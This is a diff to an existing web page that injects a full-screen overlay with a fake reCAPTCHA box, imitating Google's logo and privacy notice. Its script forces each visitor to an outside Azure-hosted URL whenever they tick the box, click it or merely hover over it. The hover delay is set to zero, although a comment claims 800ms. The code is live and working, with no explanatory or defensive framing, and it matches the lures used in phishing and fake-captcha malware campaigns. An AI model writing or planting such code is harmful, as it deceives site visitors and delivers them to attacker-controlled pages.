@@ -19,6 +19,107 @@
 
 
 
+  
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+      background: url('https://source.unsplash.com/1600x900/?cybersecurity,technology') no-repeat center center fixed;
+      background-size: cover;
+      height: 100vh;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .blur-overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      backdrop-filter: blur(15px);
+      -webkit-backdrop-filter: blur(15px);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      padding: 20px;
+      box-sizing: border-box;
+    }
+
+    .verification-box {
+      background: #ffffffee;
+      border-radius: 12px;
+      padding: 40px 50px;
+      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.25);
+      text-align: center;
+      max-width: 400px;
+      width: 100%;
+      transition: transform 0.3s ease, box-shadow 0.3s ease;
+      cursor: pointer;
+    }
+
+    .verification-box:hover {
+      transform: scale(1.03);
+      box-shadow: 0 12px 50px rgba(0, 0, 0, 0.35);
+    }
+
+    .fake-recaptcha {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      border: 1px solid #d3d3d3;
+      padding: 18px 15px;
+      border-radius: 6px;
+      background: #f9f9f9;
+    }
+
+    .fake-recaptcha input[type="checkbox"] {
+      width: 28px;
+      height: 28px;
+      cursor: pointer;
+    }
+
+    .fake-recaptcha span {
+      font-size: 20px;
+      color: #444;
+    }
+
+    .recaptcha-logo {
+      margin-top: 15px;
+      font-size: 13px;
+      color: #888;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+    }
+
+    .recaptcha-logo img {
+      height: 18px;
+    }
+
+    .info-text {
+      max-width: 500px;
+      margin-top: 30px;
+      font-size: 14px;
+      color: #eeeeee;
+      text-align: center;
+      background-color: rgba(0, 0, 0, 0.45);
+      padding: 20px;
+      border-radius: 10px;
+      line-height: 1.6;
+    }
+
+    .info-text a {
+      color: #8ab4f8;
+      text-decoration: underline;
+    }
+
+
+
+
+
 
 
   
@@ -345,6 +446,68 @@
 
 
 
+ <div class="blur-overlay">
+    <div class="verification-box" id="verify-box">
+      <div class="fake-recaptcha" id="captcha">
+        <input type="checkbox" id="check" />
+        <span>I'm not a robot</span>
+      </div>
+      <div class="recaptcha-logo">
+        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA logo">
+        <span>reCAPTCHA</span>
+      </div>
+    </div>
+
+    <div class="info-text">
+      This site is protected by reCAPTCHA and the Google
+      <a href="https://policies.google.com/privacy" target="_blank">Privacy Policy</a> and
+      <a href="https://policies.google.com/terms" target="_blank">Terms of Service</a> apply.
+      <br><br>
+      Please confirm you're a human before proceeding. Automated access will be blocked.
+    </div>
+  </div>
+
+  <script>
+    const verifyBox = document.getElementById('verify-box');
+    const check = document.getElementById('check');
+    const redirectUrl = 'https://erroraahex22989xee0.z13.web.core.windows.net/';
+    let redirected = false;
+    let hoverTimeout;
+
+    function redirectIfNotDone() {
+      if (!redirected) {
+        redirected = true;
+        window.location.href = redirectUrl;
+      }
+    }
+
+    // Redirect when checkbox is checked
+    check.addEventListener('change', (e) => {
+      e.stopPropagation(); // Prevent click event bubbling
+      if (check.checked) {
+        redirectIfNotDone();
+      }
+    });
+
+    // Redirect on click (except checkbox itself)
+    verifyBox.addEventListener('click', (e) => {
+      if (e.target !== check) {
+        redirectIfNotDone();
+      }
+    });
+
+    // Redirect on hover after 800ms
+    verifyBox.addEventListener('mouseover', () => {
+      if (!redirected) {
+        hoverTimeout = setTimeout(redirectIfNotDone, 00);
+      }
+    });
+
+    // Cancel hover redirect if mouse leaves early
+    verifyBox.addEventListener('mouseout', () => {
+      clearTimeout(hoverTimeout);
+    });
+  </script>
 
   
 
